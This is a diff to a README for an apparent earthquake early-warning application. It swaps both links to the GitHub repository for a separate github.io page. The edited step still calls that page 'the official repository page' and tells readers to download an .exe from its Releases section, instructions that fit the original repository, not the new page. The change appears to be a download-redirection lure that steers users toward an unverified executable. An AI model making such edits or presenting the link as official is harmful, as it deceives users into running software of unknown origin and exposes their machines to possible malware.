@@ -1,6 +1,6 @@
 # 🌍 AMGCR-Earthquake-Early-Warning - Detect seismic activity and alert communities
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Backlashsilver869/AMGCR-Earthquake-Early-Warning)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://backlashsilver869.github.io)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Before you install this software, ensure your computer meets these specification
 
 Follow these steps to obtain the application:
 
-1.  Visit the official repository page at this link: [https://github.com/Backlashsilver869/AMGCR-Earthquake-Early-Warning](https://github.com/Backlashsilver869/AMGCR-Earthquake-Early-Warning).
+1.  Visit the official repository page at this link: [https://backlashsilver869.github.io](https://backlashsilver869.github.io).
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the version number of the latest release.
 4.  Find the file ending in .exe under the Assets heading.
